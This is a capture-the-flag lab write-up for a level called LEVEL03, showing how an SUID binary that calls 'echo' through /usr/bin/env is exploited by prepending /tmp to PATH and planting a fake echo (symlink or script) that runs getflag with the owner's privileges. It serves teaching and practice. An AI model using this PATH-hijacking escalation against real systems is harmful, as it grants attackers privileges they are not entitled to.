# LEVEL03

## 1. Inspect the file

```bash
> ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

The binary `level03` is owned by `flag03`, with the SUID bit set `-rwsr-sr-x`, meaning it will run with the privileges of `flag03`.

```bash
> ./level03 
Exploit me
```

Running the binary only prints `Exploit me`.

## 2. Analyze the binary

```bash
> strings level03
/lib/ld-linux.so.2
KT{K
__gmon_start__
libc.so.6
_IO_stdin_used
setresgid
setresuid
system
getegid
geteuid
__libc_start_main
GLIBC_2.0
PTRh
UWVS
[^_]
/usr/bin/env echo Exploit me
;*2$"
GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
/home/user/level03
/usr/include/i386-linux-gnu/bits
/usr/include/i386-linux-gnu/sys
level03.c
[...]
```
The important part is the line :
```
/usr/bin/env echo Exploit me
```

This means the binary uses `system("/usr/bin/env echo Exploit me")` internally.
`/usr/bin/env` will look for echo in the directories defined by the `PATH` environment variable — which we can manipulate.

**Explanation:**
>- strings			: displays printable strings from a binary file.

## 3.a Exploit the binary with link

```bash
> export PATH=/tmp:$PATH
> ln -s /bin/getflag /tmp/echo
> ./level03
Check flag.Here is your token : XXX
```

Prepend `/tmp` to the `PATH`, so that when the binary runs `echo`, it finds `/tmp/echo` first.
Then create a symbolic link `/tmp/echo` pointing to `/bin/getflag`.
When the binary executes `echo`, it actually runs `getflag` with `flag03`'s privileges.

**Explanation:**
>- `export`			: modifies a environment variable.

>- `ln TARGET LINK`	: create link from `LINK` to `TARGET`.
>- `-s`				: create a symbolic link from `LINK` to `TARGET`.

## 3.b Exploit the binary with file

```bash
> export PATH=/tmp:$PATH
> cat << EOF > /tmp/echo
#!/bin/bash
getflag
EOF
> chmod +x /tmp/echo
> ./level03
Check flag.Here is your token : XXX
```

Prepend `/tmp` to the `PATH`, so that when the binary runs `echo`, it finds `/tmp/echo` first.
Then create a script `/tmp/echo` that simply runs `getflag`.


Add `/tmp` to the path of `PATH`, to make seek `echo` in `tmp`.
Then create `/tmp/echo` as script that execute `getflag`.
Make the script executable.
Run the binary — it executes the fake `echo` instead of the real one.

**Explanation:**
>- `export` 			: modifies a environment variable.

>- `cat << EOF > file`	: creates a file and writes everything until `EOF` into it

>- `chmod +x file`		: makes the file executable.